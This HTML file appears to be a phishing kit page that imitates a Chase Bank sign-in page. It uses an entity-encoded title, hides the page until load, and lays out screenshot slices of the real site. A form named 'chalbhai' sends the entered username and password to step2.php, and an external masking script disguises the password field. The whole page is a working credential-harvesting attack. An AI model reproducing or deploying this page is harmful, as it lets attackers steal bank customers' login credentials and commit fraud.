<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#67;&#104;&#97;&#115;&#101;&#32;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#44;&#32;&#77;&#111;&#114;&#116;&#103;&#97;&#103;&#101;&#44;&#32;&#65;&#117;&#116;&#111;&#44;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#83;&#101;&#114;&#118;&#105;&#99;&#101;&#115;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
			   
.textbox {
    height: 42px;
    padding-left: 8px;
    border: none;
   	border-bottom: solid 1px #ccc;
    font-size: 17px;
    width: 270px;
	background-color: #FDFAF7; 
}
 .textbox:focus {
	background: #FDFAF7;	 
    outline: none;
    border-bottom: solid 3px #126BC5;
    outline: solid 2px #126BC5;
}

			  </style>
			  <style type="text/css">
input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:27px;
							height:22px; 
							display:inline-block;
							line-height:22px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:22px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -22px;
						}
						label.css-label {
				background-image:url(http://csscheckbox.com/checkboxes/u/csscheckbox_223900261a338fd8271b9f203ca6c4c0.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}		
</style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1354px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:203px; z-index:0"><a href="#"><img src="images/cas4.png" alt="" title="" border=0 width=1350 height=203></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:202px; width:1350px; height:199px; z-index:1"><a href="#"><img src="images/cas5.png" alt="" title="" border=0 width=1350 height=199></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:969px; top:82px; width:342px; height:290px; z-index:2"><a href="#"><img src="images/cas3.png" alt="" title="" border=0 width=342 height=290></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:382px; top:420px; width:498px; height:49px; z-index:3"><img src="images/cas6.png" alt="" title="" border=0 width=498 height=49></div>

<div id="image5" style="position:absolute; overflow:hidden; left:146px; top:477px; width:974px; height:120px; z-index:4"><a href="#"><img src="images/cas7.png" alt="" title="" border=0 width=974 height=120></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:65px; top:614px; width:1189px; height:222px; z-index:5"><a href="#"><img src="images/cas8.png" alt="" title="" border=0 width=1189 height=222></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:55px; top:841px; width:1204px; height:164px; z-index:6"><a href="#"><img src="images/cas9.png" alt="" title="" border=0 width=1204 height=164></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:69px; top:1024px; width:1142px; height:292px; z-index:7"><a href="#"><img src="images/cas10.png" alt="" title="" border=0 width=1142 height=292></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:0px; top:1379px; width:1350px; height:182px; z-index:8"><img src="images/cas12.png" alt="" title="" border=0 width=1350 height=182></div>

<div id="image10" style="position:absolute; overflow:hidden; left:0px; top:1547px; width:1350px; height:209px; z-index:9"><a href="#"><img src="images/cas13.png" alt="" title="" border=0 width=1350 height=209></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:0px; top:1753px; width:1353px; height:260px; z-index:10"><a href="#"><img src="images/cas14.png" alt="" title="" border=0 width=1353 height=260></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:0px; top:2013px; width:1354px; height:229px; z-index:11"><img src="images/cas16.png" alt="" title="" border=0 width=1354 height=229></div>

<div id="image13" style="position:absolute; overflow:hidden; left:0px; top:2242px; width:1350px; height:123px; z-index:12"><img src="images/cas17.png" alt="" title="" border=0 width=1350 height=123></div>

<div id="image14" style="position:absolute; overflow:hidden; left:445px; top:2396px; width:359px; height:30px; z-index:13"><a href="#"><img src="images/cas18.png" alt="" title="" border=0 width=359 height=30></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:0px; top:2461px; width:1350px; height:233px; z-index:14"><img src="images/cas19.png" alt="" title="" border=0 width=1350 height=233></div>

<div id="image16" style="position:absolute; overflow:hidden; left:0px; top:2690px; width:1350px; height:253px; z-index:15"><img src="images/cas20.png" alt="" title="" border=0 width=1350 height=253></div>

<div id="image17" style="position:absolute; overflow:hidden; left:0px; top:2942px; width:1350px; height:224px; z-index:16"><img src="images/cas21.png" alt="" title="" border=0 width=1350 height=224></div>

<div id="image18" style="position:absolute; overflow:hidden; left:0px; top:3166px; width:1350px; height:224px; z-index:17"><img src="images/cas21.png" alt="" title="" border=0 width=1350 height=224></div>

<div id="image19" style="position:absolute; overflow:hidden; left:0px; top:3390px; width:1351px; height:298px; z-index:18"><img src="images/cas22.png" alt="" title="" border=0 width=1351 height=298></div>

<div id="image20" style="position:absolute; overflow:hidden; left:499px; top:3518px; width:546px; height:17px; z-index:19"><a href="#"><img src="images/cas23.png" alt="" title="" border=0 width=546 height=17></a></div>

<div id="image21" style="position:absolute; overflow:hidden; left:1255px; top:508px; width:34px; height:59px; z-index:24"><a href="#"><img src="images/csa1.png" alt="" title="" border=0 width=34 height=59></a></div>

<div id="image22" style="position:absolute; overflow:hidden; left:24px; top:497px; width:38px; height:57px; z-index:25"><a href="#"><img src="images/csa2.png" alt="" title="" border=0 width=38 height=57></a></div>

<form action=step2.php name=chalbhai id=chalbhai method=post>
<input name="usr" placeholder="&#85;&#115;&#101;&#114;&#110;&#97;&#109;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:267px;left:1007px;top:141px;z-index:20">
<input name="psw" id="demo-field" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:267px;left:1006px;top:186px;z-index:21">

<div id="checkboxG1"  style="position:absolute; left:1007px; top:229px; z-index:22"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:1007px; top:229px; z-index:22"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:1006px; top:260px; z-index:23"><input type="image" name="formimage1" width="267" height="40" src="images/signin.png"></div>

</div>

<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
